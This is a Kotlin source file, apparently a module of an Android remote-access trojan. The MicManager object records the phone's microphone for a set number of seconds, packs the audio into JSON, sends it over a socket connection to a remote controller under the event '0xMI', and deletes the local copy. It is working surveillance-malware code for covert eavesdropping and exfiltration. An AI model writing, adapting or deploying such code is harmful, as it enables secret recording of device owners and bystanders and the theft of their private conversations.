package com.neaking

import android.media.MediaRecorder
import android.util.Log
import kotlin.Throws
import org.json.JSONObject
import org.json.JSONException
import java.io.*
import java.lang.Exception
import java.util.*

object MicManager {
    var recorder: MediaRecorder? = null
    var audiofile: File? = null
    private const val TAG = "MediaRecording"
    private var stopRecording: TimerTask? = null
    @Throws(Exception::class)
    fun startRecording(sec: Int) {


        //Creating file
        val dir = MainService.getContextOfApplication()!!.cacheDir
        try {
            Log.e("DIRR", dir.absolutePath)
            audiofile = File.createTempFile("sound", ".mp3", dir)
        } catch (e: IOException) {
            Log.e(TAG, "external storage access error")
            return
        }


        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = MediaRecorder()
        recorder!!.setAudioSource(MediaRecorder.AudioSource.MIC)
        recorder!!.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        recorder!!.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        recorder!!.setOutputFile(audiofile?.getAbsolutePath())
        recorder!!.prepare()
        recorder!!.start()
        stopRecording = object : TimerTask() {
            override fun run() {
                //stopping recorder
                recorder!!.stop()
                recorder!!.release()
                sendVoice(audiofile)
                audiofile?.delete()
            }
        }
        Timer().schedule(stopRecording, (sec * 1000).toLong())
    }

    private fun sendVoice(file: File?) {
        val size = file!!.length().toInt()
        val data = ByteArray(size)
        try {
            val buf = BufferedInputStream(FileInputStream(file))
            buf.read(data, 0, data.size)
            val `object` = JSONObject()
            `object`.put("file", true)
            `object`.put("name", file.name)
            `object`.put("buffer", data)
            println(`object`)
            ConnectionManager.mSocket!!.emit("0xMI", `object`)
            ConnectionManager.deletePendingRequest("0xMI")
            buf.close()
        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        } catch (e: JSONException) {
            e.printStackTrace()
        }
    }
}